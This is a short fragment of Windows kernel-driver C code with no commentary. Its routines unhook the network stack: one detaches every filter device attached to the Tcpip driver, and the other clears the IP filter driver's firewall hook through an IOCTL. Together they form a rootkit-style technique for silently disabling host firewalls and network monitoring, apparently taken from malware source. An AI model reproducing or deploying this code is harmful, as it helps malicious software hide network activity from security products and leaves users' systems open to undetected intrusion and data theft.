NTSTATUS process_tdi(void)
{
	NTSTATUS ns;
	PDRIVER_OBJECT DriverObject;
	UNICODE_STRING DriverName;
	PDEVICE_OBJECT DevObj;

	RtlInitUnicodeString(&DriverName, L"\\Driver\\Tcpip");
	
	ns = ObReferenceObjectByName(&DriverName, OBJ_CASE_INSENSITIVE, NULL, 
		0, (POBJECT_TYPE)IoDriverObjectType, KernelMode, NULL, &DriverObject);
    if (!NT_SUCCESS(ns))
	{
		Dbg("ObReferenceObjectByName() fails\n");
		return ns;
	}

	DevObj = DriverObject->DeviceObject;

	while (DevObj != NULL)
	{
		DevObj->AttachedDevice = 0;
		DevObj = DevObj->NextDevice;
	}

	ObDereferenceObject(DriverObject);

	return STATUS_SUCCESS;
}

NTSTATUS process_ipfilt(void)
{
	NTSTATUS ns;
	UNICODE_STRING DevName;
	PFILE_OBJECT FileObject;
	PDEVICE_OBJECT DeviceObject;
	DWORD InBuff = 0;
	PIRP pIrp;

	RtlInitUnicodeString(&DevName, L"\\Device\\Ipfilterdriver");

	ns = IoGetDeviceObjectPointer(&DevName, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
		&FileObject, &DeviceObject);
	if (!NT_SUCCESS(ns))
	{
		Dbg("IoGetDeviceObjectPointer() fails\n");
		return ns;
	}

	pIrp = IoBuildDeviceIoControlRequest(IOCTL_IP_SET_FIREWALL_HOOK, DeviceObject, 
		&InBuff, 4, 0, 0, 0, 0, 0);
	if (pIrp == NULL)
	{
		Dbg("IoBuildDeviceIoControlRequest() fails\n");
		return STATUS_UNSUCCESSFUL;
	}

	IoCallDriver(DeviceObject, pIrp);

	return STATUS_SUCCESS;
}

VOID unhook_net()
{
	process_ipfilt();
	process_tdi();
}